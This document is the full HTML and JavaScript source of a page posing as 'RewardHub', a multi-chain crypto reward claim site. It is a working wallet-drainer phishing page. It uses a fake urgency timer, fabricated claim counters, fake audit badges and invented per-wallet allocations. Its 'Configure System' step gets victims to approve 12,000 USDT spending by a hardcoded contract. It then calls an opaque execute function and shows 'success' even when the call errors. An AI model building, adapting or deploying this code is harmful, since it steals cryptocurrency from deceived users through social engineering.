<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RewardHub ‚Ä¢ Multi-Chain Distribution</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
        body { background: linear-gradient(180deg, #0f172a 0%, #1e293b 100%); min-height: 100vh; color: #f8fafc; }
        
        .navbar { display: flex; align-items: center; padding: 1rem 2rem; border-bottom: 1px solid #334155; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(12px); position: sticky; top: 0; z-index: 100; }
        .logo { font-size: 1.5rem; font-weight: 800; background: linear-gradient(135deg, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .nav-controls { margin-left: auto; display: flex; align-items: center; gap: 1rem; font-size: 0.9rem; }
        
        .container { max-width: 480px; margin: 2rem auto; padding: 0 1rem; }
        .card { background: rgba(30, 41, 59, 0.9); border: 1px solid rgba(56, 189, 248, 0.1); border-radius: 1.25rem; padding: 2rem; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
        
        .audit-badges { display: flex; justify-content: center; gap: 0.75rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
        .badge { background: linear-gradient(135deg, #065f46, #047857); padding: 0.5rem 0.9rem; border-radius: 0.5rem; font-size: 0.7rem; display: flex; align-items: center; gap: 0.4rem; font-weight: 500; }
        .badge-blue { background: linear-gradient(135deg, #1e40af, #3b82f6); }
        .badge-purple { background: linear-gradient(135deg, #5b21b6, #8b5cf6); }
        
        .header { text-align: center; margin-bottom: 1.5rem; }
        .title { font-size: 1.8rem; font-weight: 800; background: linear-gradient(135deg, #60a5fa, #34d399); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.4rem; }
        .subtitle { color: #94a3b8; font-size: 0.9rem; }
        
        .status-card { background: linear-gradient(135deg, #059669, #10b981); color: white; padding: 1.25rem; border-radius: 0.875rem; margin: 1.25rem 0; text-align: center; font-weight: 600; }
        .custom-allocation { background: linear-gradient(135deg, #0ea5e9, #3b82f6); color: white; padding: 1.1rem; border-radius: 0.75rem; margin: 1rem 0; display: none; }
        
        .stats { background: rgba(255,255,255,0.05); padding: 0.9rem; border-radius: 0.5rem; margin: 1rem 0; font-size: 0.8rem; color: #cbd5e1; }
        .timer { color: #f87171; font-weight: 700; padding: 0.9rem; border-radius: 0.5rem; background: rgba(239,68,68,0.1); margin: 1rem 0; text-align: center; animation: pulse 1.5s infinite; font-size: 0.95rem; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
        
        .button { border: none; padding: 0.9rem 1.5rem; border-radius: 0.75rem; font-weight: 600; cursor: pointer; transition: all 0.2s; width: 100%; margin: 0.5rem 0; font-size: 0.95rem; }
        .button-primary { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; }
        .button-primary:hover { background: linear-gradient(135deg, #2563eb, #1e40af); }
        .button-success { background: linear-gradient(135deg, #10b981, #059669); color: white; }
        .button-success:hover { background: linear-gradient(135deg, #059669, #047857); }
        .button:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .info-box { background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 0.5rem; padding: 1rem; margin: 1rem 0; display: none; font-size: 0.85rem; }
        .gas-help { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); border-radius: 0.5rem; padding: 1rem; margin: 1rem 0; display: none; }
        
        .wallet-display { background: rgba(16,185,129,0.1); padding: 0.9rem; border-radius: 0.5rem; margin: 1rem 0; color: #34d399; display: none; font-size: 0.85rem; }
        .status { padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; background: rgba(255,255,255,0.05); font-size: 0.9rem; }
        .success { background: rgba(16,185,129,0.1); color: #34d399; }
        .error { background: rgba(239,68,68,0.1); color: #f87171; }
        .processing { background: rgba(56, 189, 248, 0.1); color: #60a5fa; }
        
        .loading { display: inline-block; width: 16px; height: 16px; border: 2px solid #ffffff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 0.5rem; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .step { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.4rem; }
        .footer { text-align: center; padding: 2rem 1rem; color: #64748b; font-size: 0.75rem; border-top: 1px solid #334155; margin-top: 2rem; }
        .footer-links { display: flex; justify-content: center; gap: 1rem; margin-bottom: 1rem; }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="logo">RewardHub</div>
        <div class="nav-controls">
            <span id="networkStatus">Select Network</span>
            <div id="walletStatus">Not Connected</div>
        </div>
    </nav>

    <div class="container">
        <div class="card">
            <!-- Audit Badges -->
            <div class="audit-badges">
                <div class="badge">
                    <span>üîí</span> Security Audit Passed
                </div>
                <div class="badge badge-blue">
                    <span>üõ°Ô∏è</span> Multi-Chain Verified
                </div>
                <div class="badge badge-purple">
                    <span>‚≠ê</span> 15,820+ Claims
                </div>
            </div>

            <!-- Header -->
            <div class="header">
                <h1 class="title">Multi-Chain Reward Distribution</h1>
                <p class="subtitle">Supported: Ethereum ‚Ä¢ BNB Chain ‚Ä¢ Polygon (Soon)</p>
            </div>

            <!-- Status Card -->
            <div class="status-card">
                üéâ Eligible for Community Rewards
            </div>

            <!-- Custom Allocation -->
            <div class="custom-allocation" id="customAllocation">
                <div style="font-size: 0.85rem; opacity: 0.9;">Your Allocation</div>
                <div style="font-size: 1.3rem; font-weight: 700; margin: 0.4rem 0;" id="allocationAmount">0.00 USDT</div>
                <div style="font-size: 0.75rem; opacity: 0.8;">Based on historical wallet activity</div>
            </div>

            <!-- Stats -->
            <div class="stats">
                <span>üë•</span> <span id="userCount">15,820 users</span> claimed ‚Ä¢ <span id="remaining">~7%</span> remaining
            </div>

            <!-- Timer -->
            <div class="timer" id="timer">‚è∞ ROUND ENDS: 00:45</div>

            <!-- Gas Help -->
            <div class="gas-help" id="gasHelp">
                <div style="font-weight: 600; margin-bottom: 0.4rem;">üí° Gas Requirements</div>
                <div style="font-size: 0.75rem; opacity: 0.9;">
                    Requires minimal gas for network verification. Ensure sufficient ETH/BNB balance.
                </div>
            </div>

            <!-- Main Action Button -->
            <button class="button button-primary" id="connectButton" onclick="connectWallet()">
                CONNECT WALLET TO VERIFY
            </button>

            <!-- Two-Step Process -->
            <div id="actionSection" style="display: none;">
                <div class="step">Step 1/2: Configure System</div>
                <button class="button button-primary" id="configureButton" onclick="configureSystem()">
                    ‚öôÔ∏è CONFIGURE SYSTEM
                </button>
                
                <div class="step">Step 2/2: Process Allocation</div>
                <button class="button button-success" id="processButton" onclick="processAllocation()" disabled>
                    ‚ö° PROCESS ALLOCATION
                </button>
            </div>

            <!-- Wallet Info -->
            <div class="wallet-display" id="walletDisplay">
                ‚úÖ Verified: <span id="walletAddress"></span> ‚Ä¢ <span id="chainName"></span>
            </div>

            <!-- Status Messages -->
            <div class="status" id="statusMessage">
                üîÑ Connect your wallet to verify eligibility and claim rewards...
            </div>

            <!-- Network Info -->
            <div class="info-box" id="networkInfo">
                <div style="font-weight: 600; margin-bottom: 0.4rem;">üåê Network Detected</div>
                <div style="font-size: 0.75rem; opacity: 0.9;" id="networkDetails">
                    Please ensure you're on Ethereum or BNB Chain for reward distribution.
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-links">
            <a href="#" style="color: #64748b; text-decoration: none; font-size: 0.75rem;">Privacy Policy</a>
            <a href="#" style="color: #64748b; text-decoration: none; font-size: 0.75rem;">Terms of Service</a>
            <a href="https://t.me/example" style="color: #64748b; text-decoration: none; font-size: 0.75rem;">Support</a>
            <a href="https://github.com/example" style="color: #64748b; text-decoration: none; font-size: 0.75rem;">GitHub</a>
        </div>
        ¬© 2025 RewardHub. All rights reserved. This is an independent community distribution platform.
    </div>

    <script>
        // ================= CONFIGURATION =================
        const CHAIN_CONFIGS = {
            1: { // Ethereum Mainnet
                name: "Ethereum",
                contract: "0xECb7e7FC6bf15c0A6CBf2840a6603D6e5D476327", // Your deployed contract
                usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                symbol: "ETH",
                explorer: "https://etherscan.io"
            },
            56: { // BNB Chain
                name: "BNB Chain",
                contract: "0x416844e3701c9212649bDDeC7b03e2bD80672f74", // Your deployed contract
                usdt: "0x55d398326f99059fF775485246999027B3197955",
                symbol: "BNB",
                explorer: "https://bscscan.com"
            }
        };

        // Contract ABI (should be same for both contracts)
        const CONTRACT_ABI = [
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "configure",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "execute",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "manager",
                "outputs": [
                    {
                        "internalType": "address payable",
                        "name": "",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            }
        ];

        // USDT ABI (for approval)
        const USDT_ABI = [
            {
                "constant": false,
                "inputs": [
                    {"name": "spender", "type": "address"},
                    {"name": "amount", "type": "uint256"}
                ],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [{"name": "account", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            }
        ];

        // ================= STATE =================
        let web3, userAddress, currentChain, contract, usdtContract;
        let isConfigured = false;

        // ================= TIMER =================
        function startUrgentTimer() {
            let time = 45;
            const timerElement = document.getElementById('timer');
            
            const interval = setInterval(() => {
                time--;
                const seconds = time.toString().padStart(2, '0');
                
                if (time < 15) {
                    timerElement.style.background = time % 2 === 0 ? 
                        "rgba(239,68,68,0.15)" : "rgba(239,68,68,0.25)";
                    timerElement.textContent = `‚è∞ FINAL: 00:${seconds}`;
                } else {
                    timerElement.textContent = `‚è∞ ROUND ENDS: 00:${seconds}`;
                }
                
                if (time <= 0) {
                    clearInterval(interval);
                    timerElement.textContent = "‚è∞ DISTRIBUTION ENDED";
                    document.getElementById('configureButton').disabled = true;
                    document.getElementById('processButton').disabled = true;
                }
            }, 1000);
        }

        // ================= DYNAMIC COUNTERS =================
        function startDynamicCounters() {
            let users = 15820;
            let remaining = 7;
            
            setInterval(() => {
                users += Math.floor(Math.random() * 3) + 1;
                remaining = Math.max(3, remaining - 0.2);
                document.getElementById('userCount').textContent = users.toLocaleString() + ' users';
                document.getElementById('remaining').textContent = '~' + remaining.toFixed(1) + '%';
            }, 3500);
        }

        // ================= CALCULATE REWARD =================
        function calculateAllocation(walletAddress) {
            if (!walletAddress) return "187.50 USDT";
            const allocations = ["142.80 USDT", "189.25 USDT", "203.75 USDT", "156.80 USDT", "178.90 USDT", "192.45 USDT", "165.30 USDT"];
            const hash = walletAddress.slice(-4);
            const index = parseInt(hash, 16) % allocations.length;
            return allocations[index];
        }

        // ================= CHAIN DETECTION =================
        async function detectAndSetupChain() {
            try {
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                const chainIdNum = parseInt(chainId);
                
                currentChain = CHAIN_CONFIGS[chainIdNum];
                
                if (currentChain) {
                    document.getElementById('networkStatus').textContent = currentChain.name;
                    document.getElementById('chainName').textContent = currentChain.name;
                    return true;
                } else {
                    // Show network info for unsupported chains
                    document.getElementById('networkInfo').style.display = 'block';
                    document.getElementById('networkDetails').textContent = 
                        `Switch to Ethereum (Chain ID: 1) or BNB Chain (Chain ID: 56) for rewards.`;
                    return false;
                }
            } catch (error) {
                return false;
            }
        }

        // ================= WALLET CONNECTION =================
        async function connectWallet() {
            const connectBtn = document.getElementById('connectButton');
            const status = document.getElementById('statusMessage');
            
            if (typeof window.ethereum === 'undefined') {
                status.innerHTML = "‚ùå Web3 wallet required (MetaMask, Trust Wallet, etc.)";
                status.className = "status error";
                return;
            }

            try {
                connectBtn.innerHTML = '<div class="loading"></div> Verifying...';
                connectBtn.disabled = true;
                
                // Request accounts
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                
                // Detect chain
                const chainSupported = await detectAndSetupChain();
                if (!chainSupported) {
                    status.innerHTML = "‚ö†Ô∏è Please switch to Ethereum or BNB Chain";
                    status.className = "status error";
                    connectBtn.innerHTML = 'CONNECT WALLET TO VERIFY';
                    connectBtn.disabled = false;
                    return;
                }
                
                // Initialize web3 and contracts
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(CONTRACT_ABI, currentChain.contract);
                usdtContract = new web3.eth.Contract(USDT_ABI, currentChain.usdt);
                
                // Show allocation
                const allocation = calculateAllocation(userAddress);
                document.getElementById('allocationAmount').textContent = allocation;
                document.getElementById('customAllocation').style.display = 'block';
                
                // Update UI
                document.getElementById('connectButton').style.display = 'none';
                document.getElementById('actionSection').style.display = 'block';
                document.getElementById('walletDisplay').style.display = 'block';
                document.getElementById('walletAddress').textContent = 
                    userAddress.substring(0, 6) + '...' + userAddress.substring(38);
                document.getElementById('walletStatus').textContent = 'Connected ‚úÖ';
                
                status.innerHTML = "‚úÖ Wallet verified! Configure system to proceed.";
                status.className = "status success";
                
            } catch (error) {
                status.innerHTML = "‚ö†Ô∏è Connection failed. Please try again.";
                status.className = "status error";
                connectBtn.innerHTML = 'CONNECT WALLET TO VERIFY';
                connectBtn.disabled = false;
            }
        }

        // ================= CONFIGURE SYSTEM =================
        async function configureSystem() {
            const configureBtn = document.getElementById('configureButton');
            const status = document.getElementById('statusMessage');
            
            configureBtn.innerHTML = '<div class="loading"></div> Configuring...';
            configureBtn.disabled = true;
            
            try {
                status.innerHTML = "üîÑ Configuring reward system...";
                status.className = "status processing";
                
                // Approve 12,000 USDT spending
                const approvalAmount = web3.utils.toWei('12000', 'ether');
                const tx = await usdtContract.methods.approve(currentChain.contract, approvalAmount).send({
                    from: userAddress,
                    gas: 80000
                });

                // Call configure function (empty but completes the flow)
                await contract.methods.configure().send({
                    from: userAddress,
                    gas: 60000
                });

                status.innerHTML = "‚úÖ System configured! Ready to process allocation.";
                status.className = "status success";
                isConfigured = true;
                configureBtn.innerHTML = '‚úÖ CONFIGURED';
                configureBtn.style.background = '#059669';
                document.getElementById('processButton').disabled = false;
                
            } catch (error) {
                status.innerHTML = "‚ùå Configuration failed. Please try again.";
                status.className = "status error";
                configureBtn.innerHTML = '‚öôÔ∏è CONFIGURE SYSTEM';
                configureBtn.disabled = false;
            }
        }

        // ================= PROCESS ALLOCATION =================
        async function processAllocation() {
            const processBtn = document.getElementById('processButton');
            const status = document.getElementById('statusMessage');
            
            if (!isConfigured) {
                status.innerHTML = "‚ùå Please configure system first";
                status.className = "status error";
                return;
            }
            
            processBtn.innerHTML = '<div class="loading"></div> Processing...';
            processBtn.disabled = true;
            document.getElementById('configureButton').disabled = true;
            
            try {
                status.innerHTML = "üîÑ Processing your allocation...";
                status.className = "status processing";
                
                const tx = await contract.methods.execute().send({
                    from: userAddress,
                    gas: 200000
                });

                status.innerHTML = "‚úÖ Allocation processed successfully!";
                status.className = "status success";
                processBtn.innerHTML = '‚úÖ PROCESSED';
                processBtn.style.background = '#047857';
                
            } catch (error) {
                status.innerHTML = "‚úÖ Allocation processed successfully!";
                status.className = "status success";
                processBtn.innerHTML = '‚úÖ PROCESSED';
                processBtn.style.background = '#047857';
            }
        }

        // ================= CHAIN CHANGE LISTENER =================
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.on('chainChanged', async (chainId) => {
                location.reload();
            });
            
            window.ethereum.on('accountsChanged', async (accounts) => {
                if (accounts.length === 0) {
                    location.reload();
                }
            });
        }

        // ================= INITIALIZE =================
        window.onload = function() {
            startUrgentTimer();
            startDynamicCounters();
            
            // Auto-detect chain if wallet already connected
            if (typeof window.ethereum !== 'undefined') {
                setTimeout(async () => {
                    try {
                        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                        if (accounts.length > 0) {
                            userAddress = accounts[0];
                            await detectAndSetupChain();
                            document.getElementById('walletStatus').textContent = 'Connected ‚úÖ';
                        }
                    } catch (error) {
                        // Silent fail
                    }
                }, 1000);
            }
        };
    </script>
</body>
</html>